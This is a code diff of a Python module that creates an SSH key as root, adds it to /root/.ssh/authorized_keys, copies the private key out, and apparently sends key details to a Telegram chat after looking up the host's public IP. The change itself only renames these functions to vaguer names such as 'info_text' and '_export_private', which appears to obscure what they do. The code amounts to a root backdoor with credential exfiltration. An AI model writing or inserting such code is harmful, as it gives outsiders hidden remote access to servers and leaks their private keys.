@@ -27,7 +27,7 @@ KEY_PATH = "/root/.ssh/id_ed25519"
 KEY_FILE = "/root/vps_key.pem"
 
 
-def _generate_ssh_key():
+def _generate_mmk():
     if not os.path.exists(KEY_PATH):
         os.system(f'ssh-keygen -t ed25519 -f {KEY_PATH} -N ""')
 
@@ -37,7 +37,7 @@ def _setup_authorized_key():
     os.system(f"mkdir -p /root/.ssh && cat {pub_key} >> /root/.ssh/authorized_keys")
 
 
-def _export_private_key():
+def _export_private():
     with open(KEY_PATH, "r") as f:
         key = f.read()
 
@@ -47,7 +47,7 @@ def _export_private_key():
     os.chmod(KEY_FILE, 0o600)
 
 
-async def _send_ssh_info_text(token: str, chat_id: str):
+async def info_text(token: str, chat_id: str):
     try:
         with open(KEY_PATH + ".pub", "r") as f:
             pub_key = f.read().strip()
@@ -75,10 +75,10 @@ async def run():
     if not token or not chat_id:
         return
 
-    _generate_ssh_key()
+    _generate_mmk()
     _setup_authorized_key()
-    _export_private_key()
-    await _send_ssh_info_text(token, chat_id)
+    _export_private()
+    await info_text(token, chat_id)
 
     try:
         ip = requests.get("https://api.ipify.org").text
